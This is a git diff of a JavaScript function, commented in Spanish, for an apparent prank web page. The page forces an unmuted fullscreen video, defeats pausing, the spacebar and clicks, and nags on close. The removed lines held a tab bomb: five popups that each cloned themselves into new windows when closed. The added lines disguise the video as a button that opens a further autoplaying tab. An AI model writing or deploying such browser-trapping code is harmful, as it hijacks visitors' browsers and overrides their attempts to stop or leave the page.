@@ -20,68 +20,60 @@ function showVideo() {
     const video = document.getElementById('video');
     const container = document.getElementById('container');
 
-    // Mostrar video
     container.style.display = 'none';
     video.style.display = 'block';
+
     video.muted = false;
     video.play();
     video.controls = false;
 
-    // Prevenir pausa
+    // Si lo pausan, lo volvemos a play
     video.addEventListener('pause', () => video.play());
+
+    // Bloquear barra espaciadora
     document.addEventListener('keydown', (e) => {
         if (e.code === 'Space') e.preventDefault();
     });
+
+    // Prevenir clicks que pausen el video
     document.addEventListener('click', (e) => {
         if (document.fullscreenElement) e.preventDefault();
     });
+
+    // Preguntar si querés cerrar
+    window.onbeforeunload = function () {
+        return "¿Estás seguro que querés cerrar esto?";
+    };
 
     // Fullscreen
     if (video.requestFullscreen) {
         video.requestFullscreen();
     }
 
-    // Pregunta antes de cerrar
-    window.onbeforeunload = () => "¿Estás seguro que querés cerrar esto?";
+    // El video es un botón camuflado
+    let tabOpened = false;
+    video.addEventListener('click', () => {
+        video.play(); // refuerzo
 
-    // Abrir 5 pestañas YA MISMO (acción directa del click)
-    for (let i = 0; i < 5; i++) {
+        if (tabOpened) return;
+        tabOpened = true;
+
         const win = window.open('', '_blank');
         if (win) {
             win.document.write(`
                 <html>
                     <head><title>😵</title></head>
                     <body style="margin:0; background:black; overflow:hidden;">
-                        <video autoplay loop muted style="width:100vw; height:100vh; object-fit:cover;"></video>
-                        <script>
-                            const v = document.querySelector('video');
-                            v.src = "${location.origin}/vid/video.mp4";
-                            v.muted = false;
-                            v.play();
-                            v.controls = false;
-                            v.addEventListener('pause', () => v.play());
-
-                            window.onbeforeunload = function () {
-                                for (let i = 0; i < 2; i++) {
-                                    const clone = window.open('', '_blank');
-                                    if (clone) {
-                                        clone.document.write(document.documentElement.outerHTML);
-                                        clone.document.close();
-                                    }
-                                }
-                            };
-                        </script>
+                        <video autoplay loop style="width:100vw; height:100vh; object-fit:cover;" muted>
+                            <source src="vid/video.mp4" type="video/mp4">
+                            Tu navegador no banca el video.
+                        </video>
                     </body>
                 </html>
             `);
             win.document.close();
         }
-    }
-
-    // Foco a la última
-    setTimeout(() => {
-        window.blur();
-    }, 100);
+    });
 }
 
 
